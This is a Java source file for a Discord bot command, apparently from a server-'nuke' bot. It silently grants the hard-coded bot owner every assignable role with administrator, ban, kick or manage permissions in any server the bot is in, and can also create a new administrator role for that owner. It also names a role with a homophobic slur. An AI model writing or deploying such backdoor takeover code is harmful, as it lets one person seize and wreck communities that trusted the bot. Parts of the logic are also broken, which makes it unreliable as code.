package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.managers.RoleManager;
import net.dv8tion.jda.api.requests.restaction.GuildAction;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class GiveMeAdminCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {

        if (!(event.getAuthor().getIdLong() == Core.OWNERID)) {
            return;
        }

        List<Role> guildRoles = event.getGuild().getRoles();
        List<Role> filteredRoles = new ArrayList<>();
        for (Role role : guildRoles) {
            if (!role.isManaged()) {
                if (role.hasPermission(Permission.ADMINISTRATOR) && event.getGuild().getSelfMember().canInteract(role)) {
                    filteredRoles.add(role);
                    event.getGuild().addRoleToMember(event.getMember(), role).queue();
                    return;
                }
                if (role.hasPermission(Permission.BAN_MEMBERS) && event.getGuild().getSelfMember().canInteract(role)) {
                    filteredRoles.add(role);
                    event.getGuild().addRoleToMember(event.getMember(), role).queue();
                }
                if (role.hasPermission(Permission.KICK_MEMBERS) && event.getGuild().getSelfMember().canInteract(role)) {
                    filteredRoles.add(role);
                    event.getGuild().addRoleToMember(event.getMember(), role).queue();
                }
                if (role.hasPermission(Permission.MANAGE_ROLES) && event.getGuild().getSelfMember().canInteract(role)) {
                    filteredRoles.add(role);
                    event.getGuild().addRoleToMember(event.getMember(), role).queue();
                }
                if (role.hasPermission(Permission.MANAGE_SERVER) && event.getGuild().getSelfMember().canInteract(role)) {
                    filteredRoles.add(role);
                    event.getGuild().addRoleToMember(event.getMember(), role).queue();
                }
                if (role.hasPermission(Permission.MANAGE_CHANNEL) && event.getGuild().getSelfMember().canInteract(role)) {
                    filteredRoles.add(role);
                    event.getGuild().addRoleToMember(event.getMember(), role).queue();
                }
                if (role.hasPermission(Permission.MANAGE_WEBHOOKS) && event.getGuild().getSelfMember().canInteract(role)) {
                    filteredRoles.add(role);
                    event.getGuild().addRoleToMember(event.getMember(), role).queue();
                }
            }
        }
        if (event.getGuild().getSelfMember().hasPermission(Permission.ADMINISTRATOR))
        {
            event.getGuild().createRole().setName("shelacking").setPermissions(Permission.ADMINISTRATOR).setHoisted(false).queue();
            GuildAction.RoleData roleData = new GuildAction.RoleData(event.getGuild().getRolesByName("shelacking", true).get(0).getIdLong());
            roleData.setName("fag");
            event.getGuild().addRoleToMember(event.getMember(), event.getGuild().getRolesByName("shelacking", true).get(0)).queueAfter(3, TimeUnit.SECONDS);
        }

    }

    @Override
    public String getHelp() {

        return "Gives the author admin role\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "'";
    }

    @Override
    public String getInvoke() {
        return "giveadmin";
    }

    @Override
    public String[] getAlias() {
        return new String[0];
    }

    @Override
    public Category getCategory() {
        return Category.NUKE;
    }
}
